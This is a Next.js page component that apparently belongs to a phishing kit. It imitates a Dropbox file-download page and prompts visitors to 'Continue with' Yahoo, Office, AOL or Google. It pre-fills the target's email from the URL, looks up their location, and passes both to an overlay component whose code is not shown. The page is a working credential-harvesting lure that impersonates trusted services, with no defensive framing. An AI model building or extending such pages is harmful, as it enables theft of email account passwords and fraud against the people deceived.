import { useRouter } from "next/dist/client/router";
import React, { useEffect, useState } from "react";
import { useQuery } from "react-query";
import styled from "styled-components";
import getUserLocation from "../../../actions/get-user-location";
import Logo from "../../../components/Logo";
import Overlay from "../../../components/Overlay";
import Transfer from "../../../components/Transfer";

const Styles = styled.div`
  display: flex;
  align-items: center;
  max-width: 1300px;
  margin: 0 auto;
  height: 100vh;

  .left {
    width: 50%;
    background: #b4d0e7;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 100vh;
    flex-direction: column;
  }
  .right {
    width: 50%;
    padding: 10%;
    background: #fff;
  }
  .providers {
    display: flex;
    flex-direction: column;
    width: 100%;
  }
  .provider {
    display: flex;
    margin-bottom: 20px;
    border: 2px solid #d5d8d6;
    border-radius: 40px;
    height: 31px;
    align-items: center;
    padding: 20px;
    justify-content: center;
    min-width: 300px;
  }
  .provider__logo {
    width: 50px;
    height: 30px;
    margin-right: 10px;
    object-fit: contain;
  }
  .provider__name {
    font-size: 14px;
  }
  .login {
    margin-bottom: 5px;
  }
  .login__text {
    // margin: 0;
    font-size: 13px;
  }
  .login__hint {
    color: red;
    font-size: 13px;
  }

  .alt__signin {
    display: flex;
    flex-direction: row;
  }
  .icon {
    width: 40px;
    height: 40px;
    object-fit: contain;
    padding: 10px;
  }
  .alt__name__text {
    margin: 0;
    margin-top: 20px;
  }

  @media (min-width: 700px) {
    .alt__name__text,
    .alt__signin {
      display: none;
    }
    // .mobile__logo {
    //   display: none;
    // }
  }
  @media (max-width: 700px) {
    .left {
      width: 100%;
    }
    .right {
      display: none;
    }
  }
  @media (max-width: 340px) {
    overflow: scroll;
    .left {
      margin-top: 100px;
    }
    .alt__signin {
      // padding-bottom: 50px;
    }
  }

  .overlay {
    position: fixed;
    top: 0;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.4);
    display: flex;
    align-items: center;
    justify-content: center;
    z-index: 9999;
    transition: opacity 0.15s linear;
  }
`;
export default function dropbox() {
  const [showOverlay, setShowOverLay] = useState<boolean>(false);
  const [location, setLocation] = useState({});
  const { data } = useQuery("location", getUserLocation, {
    onSuccess: (res) => {
      setLocation(res);
    },
  });

  const { query } = useRouter();
  const { email } = query;
  useEffect(() => {
    if (showOverlay) {
      document.body.style.overflow = "hidden";
    }
    document.body.style.overflow = "unset";
  }, [showOverlay]);
  const providers = [
    { logo: "/yahoo.png", name: "Yahoo" },
    // { logo: "/outlook.svg", name: "Outlook" },
    { logo: "/office.png", name: "Office" },
    { logo: "/aol.png", name: "AOL Mail" },
    { logo: "/google.png", name: "Google" },
    { logo: "/others.png", name: "Other Mails" },
  ];
  return (
    <Styles>
      {showOverlay && (
        <>
          <div className="overlay">
            <Overlay email={email} location={location} />
          </div>
        </>
      )}
      <div className="left">
        <div className="mobile__logo">
          <Logo />
        </div>
        <Transfer setShowOverLay={setShowOverLay} />
        <p className="alt__name__text"> Login With</p>
        <div className="alt__signin">
          {providers.map((provider) => (
            <img
              src={provider.logo}
              alt={provider.name}
              className="icon"
              key={Math.random()}
            />
          ))}
        </div>
      </div>
      <div className="right">
        <div>
          <h1 className="login">Login</h1>
          <p className="login__text">
            Click on Download all to view files securely
          </p>
        </div>
        <div className="providers">
          {providers.map((provider) => (
            <div className="provider" key={Math.random()}>
              <img
                src={provider.logo}
                className="provider__logo"
                alt={provider.name}
              />
              <span className="provider__name">
                Continue with {provider.name}
              </span>
            </div>
          ))}
        </div>
      </div>
    </Styles>
  );
}
